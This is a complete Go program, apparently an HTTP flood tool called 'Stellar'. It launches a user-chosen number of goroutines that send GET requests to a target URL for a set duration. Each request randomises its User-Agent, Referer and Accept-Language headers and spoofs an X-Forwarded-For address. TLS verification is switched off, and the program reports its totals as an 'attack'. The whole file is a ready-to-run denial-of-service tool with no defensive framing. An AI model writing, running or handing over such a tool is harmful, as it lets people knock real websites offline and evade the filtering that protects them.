package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

var randGen = rand.New(rand.NewSource(time.Now().UnixNano()))

var referers = []string{
	"https://www.google.com/",
	"https://www.example.com/",
	"https://www.wikipedia.org/",
	"https://www.reddit.com/",
	"https://www.github.com/",
	"https://www.youtube.com/",
	"https://www.facebook.com/",
	"https://www.twitter.com/",
	"https://duckduckgo.com/",
}

var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"fr-FR,fr;q=0.9",
	"es-ES,es;q=0.9",
	"de-DE,de;q=0.9",
}

type Stellar struct {
	url           string
	stop          chan struct{}
	workers       int
	successCount  int64
	totalRequests int64
	wg            sync.WaitGroup
}

func checkWebsite(website string) error {
	// Perform a single GET request to check the website's status
	req, err := http.Get(website)
	if err != nil {
		return fmt.Errorf("error checking website %s: %v", website, err)
	}
	defer req.Body.Close()

	// Print the status of the website
	fmt.Printf("%s is up with status code %d\n", website, req.StatusCode)
	return nil
}

func generateUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/91.0.4472.124 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Safari/604.1",
	}
	return userAgents[randGen.Intn(len(userAgents))]
}

func generateFakeIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randGen.Intn(256), randGen.Intn(256), randGen.Intn(256), randGen.Intn(256))
}

func NewStellar(target string, workers int) (*Stellar, error) {
	if target == "" {
		return nil, fmt.Errorf("invalid URL")
	}
	return &Stellar{
		url:     target,
		stop:    make(chan struct{}),
		workers: workers,
	}, nil
}

func (s *Stellar) launchWorker() {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	for {
		select {
		case <-s.stop:
			return
		default:
			req, err := http.NewRequest("GET", s.url, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", generateUserAgent())
			req.Header.Set("Referer", referers[randGen.Intn(len(referers))])
			req.Header.Set("Connection", "Keep-Alive")
			req.Header.Set("Cache-Control", "max-age=0,no-cache")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("Accept-Language", acceptLanguages[randGen.Intn(len(acceptLanguages))])
			req.Header.Set("Accept-Encoding", "gzip, deflate")
			req.Header.Set("X-Forwarded-For", generateFakeIP())

			resp, err := client.Do(req)
			if err == nil && resp.StatusCode < 500 {
				atomic.AddInt64(&s.successCount, 1)
			}
			atomic.AddInt64(&s.totalRequests, 1)
			if resp != nil {
				resp.Body.Close()
			}
		}
	}
}

func (s *Stellar) StartAttack(duration time.Duration) {
	s.wg.Add(s.workers)
	for i := 0; i < s.workers; i++ {
		go func() {
			defer s.wg.Done()
			s.launchWorker()
		}()
	}

	time.Sleep(duration)
	close(s.stop)
	s.wg.Wait()
	fmt.Printf("Total Requests Sent: %d, Successful Requests: %d\n", s.totalRequests, s.successCount)
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run main.go <target URL> <workers> <duration in seconds>")
		return
	}

	target := os.Args[1]
	workers, err := strconv.Atoi(os.Args[2])
	if err != nil || workers < 1 {
		fmt.Println("Error: invalid number of workers")
		return
	}

	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration < 1 {
		fmt.Println("Error: invalid duration")
		return
	}

	// Perform a single check of the target website before starting the attack
	if err := checkWebsite(target); err != nil {
		fmt.Println(err)
		return
	}

	stellar, err := NewStellar(target, workers)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Printf("Starting attack on %s with %d workers for %d seconds...\n", target, workers, duration)
	stellar.StartAttack(time.Duration(duration) * time.Second)
	fmt.Println("Attack finished.")
}
